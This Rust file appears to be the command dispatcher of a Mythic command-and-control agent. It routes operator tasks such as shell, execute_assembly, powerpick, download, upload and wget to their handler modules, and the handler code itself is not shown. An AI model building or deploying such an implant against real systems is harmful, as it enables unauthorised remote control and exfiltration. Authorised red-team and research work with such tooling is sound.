#[path = "commands/cat.rs"]
mod cat;
#[path = "commands/cd.rs"]
mod cd;
#[path = "commands/cp.rs"]
mod cp;
#[path = "commands/download.rs"]
mod download;
#[path = "commands/env.rs"]
mod env;
#[path = "commands/execute_assembly.rs"]
mod execute_assembly;
#[path = "commands/exit.rs"]
mod exit;
#[path = "commands/kill.rs"]
mod kill;
#[path = "commands/ls.rs"]
mod ls;
#[path = "commands/mkdir.rs"]
mod mkdir;
#[path = "commands/mv.rs"]
mod mv;
#[path = "commands/netstat.rs"]
mod netstat;
#[path = "commands/powerpick.rs"]
mod powerpick;
#[path = "commands/ps.rs"]
mod ps;
#[path = "commands/pwd.rs"]
mod pwd;
#[path = "commands/resolve.rs"]
mod resolve;
#[path = "commands/rm.rs"]
mod rm;
#[path = "commands/shell.rs"]
mod shell;
#[path = "commands/sleep.rs"]
mod sleep;
#[path = "commands/sysinfo.rs"]
mod sysinfo;
#[path = "commands/upload.rs"]
mod upload;
#[path = "commands/wget.rs"]
mod wget;
#[path = "commands/whoami.rs"]
mod whoami;

use mythic::{TaskMessage, TaskResponse};

/// Route any command to its handler.
pub fn dispatch(task: &TaskMessage) -> TaskResponse {
    match task.command.as_str() {
        "cat" => cat::handle(task),
        "cd" => cd::handle(task),
        "cp" => cp::handle(task),
        "download" => download::handle(task),
        "env" => env::handle(task),
        "execute_assembly" | "executeAssembly" => execute_assembly::handle(task),
        "exit" => exit::handle(task),
        "kill" => kill::handle(task),
        "ls" => ls::handle(task),
        "mkdir" => mkdir::handle(task),
        "mv" => mv::handle(task),
        "netstat" => netstat::handle(task),
        "powerpick" | "PowerPick" => powerpick::handle(task),
        "ps" => ps::handle(task),
        "pwd" => pwd::handle(task),
        "resolve" => resolve::handle(task),
        "rm" => rm::handle(task),
        "shell" => shell::handle(task),
        "sleep" => sleep::handle(task),
        "sysinfo" => sysinfo::handle(task),
        "upload" => upload::handle(task),
        "wget" => wget::handle(task),
        "whoami" => whoami::handle(task),
        unknown => TaskResponse::failed(task.id, &format!("unknown command: {unknown}")),
    }
}
